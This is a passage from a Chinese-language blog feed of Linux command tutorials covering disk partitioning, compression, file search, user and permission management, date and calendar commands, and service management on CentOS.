基本语法</h2><ul><li>fdisk -l （功能描述：查看磁盘分区详情） </li><li>fdisk 硬盘设备名 （功能描述：对新增硬盘进行分区操作）</li></ul><h2 id="5-2-选项说明"><a href="#5-2-选项说明" class="headerlink" title="5.2 选项说明"></a>5.2 选项说明</h2><ul><li>-l 显示所有硬盘的分区列表</li></ul><h2 id="5-3-案例操作"><a href="#5-3-案例操作" class="headerlink" title="5.3 案例操作"></a>5.3 案例操作</h2><h3 id="（1）fdisk-l-查看当前分区情况"><a href="#（1）fdisk-l-查看当前分区情况" class="headerlink" title="（1）fdisk -l 查看当前分区情况"></a>（1）fdisk -l 查看当前分区情况</h3><p><img src="/blog/88f27417.html/image-20221204140850463.png"></p><h3 id="（2）新增磁盘"><a href="#（2）新增磁盘" class="headerlink" title="（2）新增磁盘"></a>（2）新增磁盘</h3><p>新增磁盘后，重启服务器，查看设备挂载详细信息；</p><p><img src="/blog/88f27417.html/image-20221204141324917.png"></p><h3 id="（3）为新增磁盘创建文件系统"><a href="#（3）为新增磁盘创建文件系统" class="headerlink" title="（3）为新增磁盘创建文件系统"></a>（3）为新增磁盘创建文件系统</h3><p><img src="/blog/88f27417.html/image-20221204141837011.png"></p><h3 id="（4）创建挂载点"><a href="#（4）创建挂载点" class="headerlink" title="（4）创建挂载点"></a>（4）创建挂载点</h3><p><img src="/blog/88f27417.html/image-20221204142035414.png"></p><h3 id="（5）查看挂载情况"><a href="#（5）查看挂载情况" class="headerlink" title="（5）查看挂载情况"></a>（5）查看挂载情况</h3><p><img src="/blog/88f27417.html/image-20221204142114489.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 压缩解压类</title>
      <link href="/blog/36e89543.html/"/>
      <url>/blog/36e89543.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：gzip-x2F-gunzip-压缩"><a href="#一：gzip-x2F-gunzip-压缩" class="headerlink" title="一：gzip&#x2F;gunzip 压缩"></a>一：gzip&#x2F;gunzip 压缩</h1><h2 id="1-1-基本语法"><a href="#1-1-基本语法" class="headerlink" title="1.1 基本语法"></a>1.1 基本语法</h2><ul><li>gzip 文件 （功能描述：压缩文件，只能将文件压缩为*.gz 文件） </li><li>gunzip 文件.gz （功能描述：解压缩文件命令）</li></ul><h2 id="1-2-经验技巧"><a href="#1-2-经验技巧" class="headerlink" title="1.2 经验技巧"></a>1.2 经验技巧</h2><ul><li>只能压缩文件不能压缩目录 </li><li>不保留原来的文件 </li><li>同时多个文件会产生多个压缩包</li></ul><h1 id="二：zip-x2F-unzip-压缩"><a href="#二：zip-x2F-unzip-压缩" class="headerlink" title="二：zip&#x2F;unzip 压缩"></a>二：zip&#x2F;unzip 压缩</h1><ul><li>zip [选项] XXX.zip 将要压缩的内容 （功能描述：压缩文件和目录的命令）<ul><li>-r 压缩目录</li></ul></li><li>unzip [选项] XXX.zip （功能描述：解压缩文件）<ul><li>-d&lt;目录&gt; 指定解压后文件的存放目录</li></ul></li><li>zip 压缩命令在windows&#x2F;linux都通用，可以压缩目录且保留源文件。</li></ul><h1 id="三：tar-打包"><a href="#三：tar-打包" class="headerlink" title="三：tar 打包"></a>三：tar 打包</h1><h2 id="3-1-基本语法"><a href="#3-1-基本语法" class="headerlink" title="3.1 基本语法"></a>3.1 基本语法</h2><ul><li>tar [选项] XXX.tar.gz 将要打包进去的内容 （功能描述：打包目录，压缩后的 文件格式.tar.gz）</li></ul><h2 id="3-2-选项说明"><a href="#3-2-选项说明" class="headerlink" title="3.2 选项说明"></a>3.2 选项说明</h2><p><img src="/blog/36e89543.html/image-20221204012617685.png"></p><h2 id="3-3-示例"><a href="#3-3-示例" class="headerlink" title="3.3 示例"></a>3.3 示例</h2><ul><li>压缩多个文件：tar -zcvf xxx.tar.gz one.txt two.txt</li><li>压缩目录：tar -zcvf xxx.tar.gz  tmp&#x2F;</li><li>解压到当前目录：tar -zxvf xxx.tar.gz </li><li>解压到指定目录：tar -zxvf xxx.tar.z -C &#x2F;tmp</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 搜索查找类</title>
      <link href="/blog/f902cab.html/"/>
      <url>/blog/f902cab.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：find-查找文件或者目录"><a href="#一：find-查找文件或者目录" class="headerlink" title="一：find 查找文件或者目录"></a>一：find 查找文件或者目录</h1><p>find 指令将从指定目录向下递归地遍历其各个子目录，将满足条件的文件显示在终端。</p><h2 id="1-1-基础语法"><a href="#1-1-基础语法" class="headerlink" title="1.1 基础语法"></a>1.1 基础语法</h2><ul><li>find [搜索范围]</li></ul><h2 id="1-2-选项说明"><a href="#1-2-选项说明" class="headerlink" title="1.2 选项说明"></a>1.2 选项说明</h2><p><img src="/blog/f902cab.html/image-20221204010943217.png"></p><h2 id="1-3-示例"><a href="#1-3-示例" class="headerlink" title="1.3 示例"></a>1.3 示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前目录下 查找小于10M的文件（+n 大于 -n小于 n等于）</span></span><br><span class="line">[root@hadoop100 ~]# find ./ -size -10M</span><br></pre></td></tr></table></figure><h1 id="二：locate-快速定位文件路"><a href="#二：locate-快速定位文件路" class="headerlink" title="二：locate 快速定位文件路"></a>二：locate 快速定位文件路</h1><ul><li>locate 指令利用事先建立的系统中所有文件名称及路径的 locate 数据库实现快速定位给 定的文件。</li><li>Locate 指令无需遍历整个文件系统，查询速度较快。为了保证查询结果的准确 度，管理员必须定期更新 locate 时刻。</li></ul><h2 id="2-1-基础语法"><a href="#2-1-基础语法" class="headerlink" title="2.1 基础语法"></a>2.1 基础语法</h2><ul><li>locate 搜索文件</li><li>由于 locate 指令基于数据库进行查询，所以第一次运行前，必须使用 updatedb 指令创 建 locate 数据库。</li></ul><h1 id="三：grep-过滤查找及“-”管道符"><a href="#三：grep-过滤查找及“-”管道符" class="headerlink" title="三：grep 过滤查找及“|”管道符"></a>三：grep 过滤查找及“|”管道符</h1><p>管道符，“|”，表示将前一个命令的处理结果输出传递给后面的命令处理</p><h2 id="3-1-基本语法"><a href="#3-1-基本语法" class="headerlink" title="3.1 基本语法"></a>3.1 基本语法</h2><ul><li>grep 选项 查找内容 源文件<ul><li>-n 显示匹配行及行号。</li></ul></li></ul><h2 id="3-2-示例"><a href="#3-2-示例" class="headerlink" title="3.2 示例"></a>3.2 示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 initial-setup-ks.cfg 文件中 boot 并显示行号；</span></span><br><span class="line">[root@hadoop100 ~]# grep -n boot initial-setup-ks.cfg</span><br><span class="line">grep -n boot initial-setup-ks.cfg </span><br><span class="line">3:xconfig  --startxonboot</span><br><span class="line">12:# Run the Setup Agent on first boot</span><br><span class="line">13:firstboot --enable</span><br><span class="line">23:network  --bootproto=dhcp --device=ens33 --ipv6=auto --activate</span><br><span class="line">24:network  --bootproto=dhcp --hostname=hadoop100</span><br><span class="line">31:# System bootloader configuration</span><br><span class="line">32:bootloader --location=mbr --boot-drive=sda</span><br><span class="line">37:part /boot --fstype=&quot;xfs&quot; --ondisk=sda --size=1024</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 权限管理类</title>
      <link href="/blog/da42f97f.html/"/>
      <url>/blog/da42f97f.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：用户管理命令"><a href="#一：用户管理命令" class="headerlink" title="一：用户管理命令"></a>一：用户管理命令</h1><h2 id="1-1-useradd-添加新用"><a href="#1-1-useradd-添加新用" class="headerlink" title="1.1 useradd 添加新用"></a>1.1 useradd 添加新用</h2><ul><li>useradd 用户名 （功能描述：添加新用户） </li><li>useradd -g 组名 用户名 （功能描述：添加新用户到某个组）</li></ul><h2 id="1-2-passwd-设置用户密"><a href="#1-2-passwd-设置用户密" class="headerlink" title="1.2 passwd 设置用户密"></a>1.2 passwd 设置用户密</h2><ul><li>passwd 用户名 （功能描述：设置用户密码）</li></ul><h2 id="1-3-id-查看用户是否存在"><a href="#1-3-id-查看用户是否存在" class="headerlink" title="1.3   id 查看用户是否存在"></a>1.3   id 查看用户是否存在</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# id ghost</span><br><span class="line">uid=1000(ghost) gid=1000(ghost) 组=1000(ghost),10(wheel)</span><br></pre></td></tr></table></figure><h2 id="1-4-su-切换用户"><a href="#1-4-su-切换用户" class="headerlink" title="1.4 su 切换用户"></a>1.4 su 切换用户</h2><ul><li>su 用户名称 （功能描述：切换用户，只能获得用户的执行权限，不能获得环境变量） </li><li>su - 用户名称 （功能描述：切换到用户并获得该用户的环境变量及执行权限）</li></ul><h2 id="1-5-userdel-删除用户"><a href="#1-5-userdel-删除用户" class="headerlink" title="1.5 userdel 删除用户"></a>1.5 userdel 删除用户</h2><ul><li>userdel 用户名 （功能描述：删除用户但保存用户主目录） </li><li>userdel -r 用户名 （功能描述：用户和用户主目录，都删除）</li></ul><h2 id="1-6-who-查看登录用户信息"><a href="#1-6-who-查看登录用户信息" class="headerlink" title="1.6 who 查看登录用户信息"></a>1.6 who 查看登录用户信息</h2><ul><li>whoami （功能描述：显示自身用户名称） </li><li>who am i （功能描述：显示登录用户的用户名以及登陆时间）</li></ul><h2 id="1-7-sudo-设置普通用户具有-root-权限"><a href="#1-7-sudo-设置普通用户具有-root-权限" class="headerlink" title="1.7 sudo 设置普通用户具有 root 权限"></a>1.7 sudo 设置普通用户具有 root 权限</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置文件</span></span><br><span class="line">[root@hadoop100 ~]# vim /etc/sudoers</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在100行添加普通用户，或者修改普通用户加入 107行的wheel组</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在108行添加如下配置：</span></span><br><span class="line">ghost ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这一行不要直接放到 root 行下面，因为所有用户都属于 wheel 组。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先配置了 ghost 具有免密功能，但是程序执行到 %wheel 行时，该功能又被覆盖回需要密码。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">所以 ghost 要放到 %wheel 这行下面（108行）。</span></span><br></pre></td></tr></table></figure><p><img src="/blog/da42f97f.html/image-20221204001852660.png"></p><h2 id="1-8-usermod-修改用户"><a href="#1-8-usermod-修改用户" class="headerlink" title="1.8 usermod 修改用户"></a>1.8 usermod 修改用户</h2><ul><li>usermod -g 用户组 用户名<ul><li>-g 修改用户的初始登录组，给定的组必须存在。默认组 id 是 1。</li></ul></li></ul><h1 id="二：用户组管理命令"><a href="#二：用户组管理命令" class="headerlink" title="二：用户组管理命令"></a>二：用户组管理命令</h1><p>每个用户都有一个用户组，系统可以对一个用户组中的所有用户进行集中管理。</p><p>用户组的管理涉及用户组的添加、删除和修改。组的增加、删除和修改实际上就是对 &#x2F;etc&#x2F;group文件的更新。</p><h2 id="2-1-groupadd-新增组"><a href="#2-1-groupadd-新增组" class="headerlink" title="2.1 groupadd 新增组"></a>2.1 groupadd 新增组</h2><ul><li>groupadd 组名</li></ul><h2 id="2-2-groupdel-删除组"><a href="#2-2-groupdel-删除组" class="headerlink" title="2.2 groupdel 删除组"></a>2.2 groupdel 删除组</h2><ul><li>groupdel 组名</li></ul><h2 id="2-3-groupmod-修改组名"><a href="#2-3-groupmod-修改组名" class="headerlink" title="2.3 groupmod 修改组名"></a>2.3 groupmod 修改组名</h2><ul><li>groupmod -n 新组名 原组名</li></ul><h2 id="2-4-cat-x2F-etc-x2F-group-查看创建了哪些组"><a href="#2-4-cat-x2F-etc-x2F-group-查看创建了哪些组" class="headerlink" title="2.4 cat &#x2F;etc&#x2F;group 查看创建了哪些组"></a>2.4 cat &#x2F;etc&#x2F;group 查看创建了哪些组</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# cat  /etc/group</span><br></pre></td></tr></table></figure><h1 id="三：文件权限类"><a href="#三：文件权限类" class="headerlink" title="三：文件权限类"></a>三：文件权限类</h1><h2 id="3-1-文件属性"><a href="#3-1-文件属性" class="headerlink" title="3.1 文件属性"></a>3.1 文件属性</h2><p>Linux系统是一种典型的多用户系统，不同的用户处于不同的地位，拥有不同的权限。 为了保护系统的安全性，Linux系统对不同的用户访问同一文件（包括目录文件）的权限做 了不同的规定。在Linux中我们可以使用ll或者ls -l命令来显示一个文件的属性以及文件所属 的用户和组。</p><p><img src="/blog/da42f97f.html/image-20221204002747785.png"></p><ul><li><p>如果没有权限，就会出现减号[ - ]而已。从左至右用0-9这些数字来表示: </p><ul><li>0 首位表示类型 在Linux中第一个字符代表这个文件是目录、文件或链接文件等等 - 代表文件 d 代表目录 l 链接文档(link file)； </li><li>第1-3位确定属主（该文件的所有者）拥有该文件的权限。—User </li><li>第4-6位确定属组（所有者的同组用户）拥有该文件的权限，—Group </li><li>第7-9位确定其他用户拥有该文件的权限 —Other</li></ul></li><li><p>rwx 作用文件和目录的不同解释：</p><ul><li>作用到文件<ul><li>[ r ]代表可读(read): 可以读取，查看</li><li>[ w ]代表可写(write): 可以修改，但是不代表可以删除该文件，删除一个文件的前 提条件是对该文件所在的目录有写权限，才能删除该文件。</li><li>[ x ]代表可执行(execute):可以被系统执行</li></ul></li><li>作用到目录<ul><li>[ r ]代表可读(read): 可以读取，ls查看目录内容</li><li>[ w ]代表可写(write): 可以修改，目录内创建+删除+重命名目录</li><li>[ x ]代表可执行(execute):可以进入该目录</li></ul></li></ul></li></ul><p><img src="/blog/da42f97f.html/image-20221204003535974.png"></p><ul><li>如果查看到是文件：链接数指的是硬链接个数。 </li><li>如果查看的是文件夹：链接数指的是子文件夹个数。</li></ul><h2 id="3-2-chmod-改变权限"><a href="#3-2-chmod-改变权限" class="headerlink" title="3.2 chmod 改变权限"></a>3.2 chmod 改变权限</h2><p><img src="/blog/da42f97f.html/image-20221204003646065.png"></p><ul><li>第一种方式变更权限 chmod [ {ugoa} {+-&#x3D;} {rwx} ] </li><li>文件或目录 第二种方式变更权限 chmod [mode&#x3D;421 ] [文件或目录]</li><li>u:所有者 g:所有组 o:其他人 a:所有人(u、g、o 的总和)</li><li>修改整个文件夹里面的所有文件的所有者、所属组、其他用户都具有可读可写可 执行权限。<ul><li>chmod -R 777  Dir</li></ul></li></ul><h2 id="3-3-chown-改变所有者"><a href="#3-3-chown-改变所有者" class="headerlink" title="3.3 chown 改变所有者"></a>3.3 chown 改变所有者</h2><ul><li>chown [选项] [最终用户] [文件或目录] （功能描述：改变文件或者目录的所有者）<ul><li>-R 递归操作</li></ul></li></ul><h2 id="3-4-chgrp-改变所属组"><a href="#3-4-chgrp-改变所属组" class="headerlink" title="3.4 chgrp 改变所属组"></a>3.4 chgrp 改变所属组</h2><ul><li>chgrp [最终用户组] [文件或目录] （功能描述：改变文件或者目录的所属组）</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 时间日期类</title>
      <link href="/blog/5ce8abc3.html/"/>
      <url>/blog/5ce8abc3.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：基本操作"><a href="#一：基本操作" class="headerlink" title="一：基本操作"></a>一：基本操作</h1><h2 id="1-1-基本语法"><a href="#1-1-基本语法" class="headerlink" title="1.1 基本语法"></a>1.1 基本语法</h2><ul><li>data [OPTION]… [+FORMAT]</li></ul><h2 id="1-2-选项说明"><a href="#1-2-选项说明" class="headerlink" title="1.2 选项说明"></a>1.2 选项说明</h2><p><img src="/blog/5ce8abc3.html/image-20221203225646671.png"> </p><p>1.3 参数说明</p><p><img src="/blog/5ce8abc3.html/image-20221203225715024.png"></p><h1 id="二：显示当前时间"><a href="#二：显示当前时间" class="headerlink" title="二：显示当前时间"></a>二：显示当前时间</h1><ul><li>date （功能描述：显示当前时间） </li><li>date +%Y （功能描述：显示当前年份）</li><li>date +%m （功能描述：显示当前月份）</li><li>date +%d （功能描述：显示当前是哪一天）</li><li>date “+%Y-%m-%d %H:%M:%S” （功能描述：显示年月日时分秒）</li></ul><h1 id="三：显示非当前时间"><a href="#三：显示非当前时间" class="headerlink" title="三：显示非当前时间"></a>三：显示非当前时间</h1><ul><li>date -d ‘1 days ago’ （功能描述：显示前一天时间）</li><li>date -d ‘-1 days ago’ （功能描述：显示明天时间）</li></ul><h1 id="四：设置系统时间"><a href="#四：设置系统时间" class="headerlink" title="四：设置系统时间"></a>四：设置系统时间</h1><ul><li>date -s 字符串时间</li><li>date -s “2022-12-03 22:58:23”</li></ul><h1 id="五：查看日历"><a href="#五：查看日历" class="headerlink" title="五：查看日历"></a>五：查看日历</h1><h2 id="5-1-基本语法"><a href="#5-1-基本语法" class="headerlink" title="5.1 基本语法"></a>5.1 基本语法</h2><ul><li>cal [选项] （功能描述：不加选项，显示本月日历）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# cal</span><br><span class="line">     十二月 2022    </span><br><span class="line">日 一 二 三 四 五 六</span><br><span class="line">             1  2  3</span><br><span class="line"> 4  5  6  7  8  9 10</span><br><span class="line">11 12 13 14 15 16 17</span><br><span class="line">18 19 20 21 22 23 24</span><br><span class="line">25 26 27 28 29 30 31</span><br></pre></td></tr></table></figure><h2 id="5-2-选项说明"><a href="#5-2-选项说明" class="headerlink" title="5.2 选项说明"></a>5.2 选项说明</h2><p><img src="/blog/5ce8abc3.html/image-20221203230243814.png"></p><h2 id="5-3-示例"><a href="#5-3-示例" class="headerlink" title="5.3 示例"></a>5.3 示例</h2><p><img src="/blog/5ce8abc3.html/image-20221203230745796.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 文件目录类</title>
      <link href="/blog/5a8f7354.html/"/>
      <url>/blog/5a8f7354.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：帮助命令"><a href="#一：帮助命令" class="headerlink" title="一：帮助命令"></a>一：帮助命令</h1><h2 id="1-1-man-获得帮助信息"><a href="#1-1-man-获得帮助信息" class="headerlink" title="1.1 man 获得帮助信息"></a>1.1 man 获得帮助信息</h2><h3 id="（1）基础语法"><a href="#（1）基础语法" class="headerlink" title="（1）基础语法"></a>（1）基础语法</h3><ul><li>man [命令或配置文件]</li></ul><h3 id="（2）显示说明"><a href="#（2）显示说明" class="headerlink" title="（2）显示说明"></a>（2）显示说明</h3><p><img src="/blog/5a8f7354.html/image-20221203221810370.png"></p><h2 id="1-2-help-获取内置命令帮助信息"><a href="#1-2-help-获取内置命令帮助信息" class="headerlink" title="1.2 help 获取内置命令帮助信息"></a>1.2 help 获取内置命令帮助信息</h2><h3 id="（1）基础语法-1"><a href="#（1）基础语法-1" class="headerlink" title="（1）基础语法"></a>（1）基础语法</h3><ul><li>help [命令] ，获得 shell 内置命令的帮助信息。</li></ul><h3 id="（2）实例"><a href="#（2）实例" class="headerlink" title="（2）实例"></a>（2）实例</h3><ul><li>help cd：查看 cd 命令的帮助信息</li></ul><h1 id="二：文件目录类"><a href="#二：文件目录类" class="headerlink" title="二：文件目录类"></a>二：文件目录类</h1><h2 id="2-1-常用命令"><a href="#2-1-常用命令" class="headerlink" title="2.1 常用命令"></a>2.1 常用命令</h2><ul><li>pwd 显示当前工作目录的绝对路径</li><li>ls 列出目录</li><li>cd 切换目录</li><li>mkdir 创建一个新的目录</li><li>rmdir 删除一个空的目录</li><li>touch 创建空文件</li><li>cp 复制文件或目录</li><li>rm 删除文件或目录</li><li>mv 移动文件与目录或重命名</li><li>cat 查看文件内容</li><li>more 文件内容分屏查看器</li><li>less 分屏显示文件内容</li><li>echo 输出内容到控制台<ul><li>-e： 支持反斜线控制的字符转换</li></ul></li><li>head 显示文件头部内容</li><li>tail 输出文件尾部内容</li><li>&gt; 输出重定向和 &gt;&gt; 追加</li><li>ln 软链接</li><li>history 查看已经执行过历史命令</li></ul><h2 id="2-2-经验汇总"><a href="#2-2-经验汇总" class="headerlink" title="2.2 经验汇总"></a>2.2 经验汇总</h2><ul><li>\cp origin target：直接跳过询问，使用原生命令进行拷贝；</li><li>pwd -P：当含有软连接的目录时，显示实际路径；</li><li>more 查看文件<ul><li>Ctrl + F：向下滚动一屏；</li><li>Ctrl + B：向上滚动一屏；</li><li>&#x3D;：输出当前行号；</li><li>:f：输出文件名称和当前行号；</li></ul></li><li>less 分屏显示文件内容<ul><li>&#x2F;字符串：向下搜索，n：向下查找，N：向上查找；</li><li>q 退出</li></ul></li></ul><h1 id="三：软连接和硬链接"><a href="#三：软连接和硬链接" class="headerlink" title="三：软连接和硬链接"></a>三：软连接和硬链接</h1><h2 id="3-1-图解"><a href="#3-1-图解" class="headerlink" title="3.1 图解"></a>3.1 图解</h2><p><img src="/blog/5a8f7354.html/image-20221203223539992.png"></p><ul><li><p>软链接，单独的创建了一个连接文件，拥有自己的inode和数据库，指向了目标文件；</p><ul><li>ln -s 文件 链接</li><li>rm -rf 软链接名&#x2F;，删除会把软链接对应的真实目录下的内容删掉（千万别带 &#x2F; ）；</li></ul></li><li><p>硬链接，原本的文件多了一个指向的链接；</p><ul><li>ln 文件 链接</li><li>不同的名称指向同一个inode节点</li><li>linux 中的当前文件的链接数，指的就是硬链接数量；</li></ul></li><li><p>inode：保存了文件元信息（metadata）的节点数据；</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统管理</title>
      <link href="/blog/3de350d3.html/"/>
      <url>/blog/3de350d3.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Linux-中的进程和服务"><a href="#一：Linux-中的进程和服务" class="headerlink" title="一：Linux 中的进程和服务"></a>一：Linux 中的进程和服务</h1><ul><li>计算机中，一个正在执行的程序或者命令，叫做“进程”（process）。</li><li>启动之后一只存在、常驻内存的进程，一般被称作“服务”（service）。</li></ul><h1 id="二：service-服务管理（CentOS-6）"><a href="#二：service-服务管理（CentOS-6）" class="headerlink" title="二：service 服务管理（CentOS 6）"></a>二：service 服务管理（CentOS 6）</h1><h2 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h2><p>service 服务名 start | stop | restart | status</p><h2 id="2-2-系统位置"><a href="#2-2-系统位置" class="headerlink" title="2.2 系统位置"></a>2.2 系统位置</h2><p>查看服务的方法：&#x2F;etc&#x2F;init.d&#x2F;服务名，.d表示是一个守护进程；</p><h1 id="三：systemctl-服务管理（CentOS-7）"><a href="#三：systemctl-服务管理（CentOS-7）" class="headerlink" title="三：systemctl 服务管理（CentOS 7）"></a>三：systemctl 服务管理（CentOS 7）</h1><h2 id="3-1-基本语法"><a href="#3-1-基本语法" class="headerlink" title="3.1 基本语法"></a>3.1 基本语法</h2><p>systemctl start | stop | restart | status 服务名</p><h2 id="3-2-系统位置"><a href="#3-2-系统位置" class="headerlink" title="3.2 系统位置"></a>3.2 系统位置</h2><p>查看服务的方法：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system</p><h1 id="四：网络服务示例"><a href="#四：网络服务示例" class="headerlink" title="四：网络服务示例"></a>四：网络服务示例</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止老版本的网络服务</span></span><br><span class="line">[root@hadoop100 ~]# service network stop </span><br><span class="line">Stopping network (via systemctl):                          [  确定  ]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启新版本网络服务</span></span><br><span class="line">[root@hadoop100 ~]# systemctl restart NetworkManager</span><br><span class="line">[root@hadoop100 ~]# systemctl status NetworkManager</span><br><span class="line">● NetworkManager.service - Network Manager</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/NetworkManager.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since 六 2022-12-03 19:29:45 CST; 14s ago</span><br><span class="line">     Docs: man:NetworkManager(8)</span><br><span class="line"> Main PID: 63186 (NetworkManager)</span><br><span class="line">    Tasks: 4</span><br><span class="line">   CGroup: /system.slice/NetworkManager.service</span><br><span class="line">           └─63186 /usr/sbin/NetworkManager --no-daemon # daemon 守护进程</span><br></pre></td></tr></table></figure><h1 id="五：设置开机启动服务"><a href="#五：设置开机启动服务" class="headerlink" title="五：设置开机启动服务"></a>五：设置开机启动服务</h1><h2 id="5-1-使用命令进入"><a href="#5-1-使用命令进入" class="headerlink" title="5.1 使用命令进入"></a>5.1 使用命令进入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 system]# setup</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">带*的服务：开机自动启动，按空格取消；</span></span><br></pre></td></tr></table></figure><p><img src="/blog/3de350d3.html/image-20221203193553730.png"></p><h2 id="5-2-查看开机自启动服务"><a href="#5-2-查看开机自启动服务" class="headerlink" title="5.2 查看开机自启动服务"></a>5.2 查看开机自启动服务</h2><h3 id="（1）CentOS-6"><a href="#（1）CentOS-6" class="headerlink" title="（1）CentOS 6"></a>（1）CentOS 6</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看列表</span></span><br><span class="line">[root@hadoop100 ~]# chkconfig --list</span><br><span class="line"></span><br><span class="line">注：该输出结果只显示 SysV 服务，并不包含</span><br><span class="line">原生 systemd 服务。SysV 配置数据</span><br><span class="line">可能被原生 systemd 配置覆盖。 </span><br><span class="line"></span><br><span class="line">      要列出 systemd 服务，请执行 &#x27;systemctl list-unit-files&#x27;。</span><br><span class="line">      查看在具体 target 启用的服务请执行</span><br><span class="line">      &#x27;systemctl list-dependencies [target]&#x27;。</span><br><span class="line"></span><br><span class="line">netconsole     0:关1:关2:关3:关4:关5:关6:关</span><br><span class="line">network        0:关1:关2:开3:开4:开5:开6:关</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启系统级别3的 network服务</span></span><br><span class="line">[root@hadoop100 ~]# chkconfig --level 3 network on</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭系统级别3的 network服务</span></span><br><span class="line">[root@hadoop100 ~]# chkconfig --level 3 network off</span><br></pre></td></tr></table></figure><h3 id="（2）CentOS-7"><a href="#（2）CentOS-7" class="headerlink" title="（2）CentOS 7"></a>（2）CentOS 7</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# systemctl list-unit-files</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">enabled 开机启动</span></span><br><span class="line">runlevel5.target                              enabled</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">disable</span> 开机不启动</span> </span><br><span class="line">runlevel6.target                              disabled</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">static 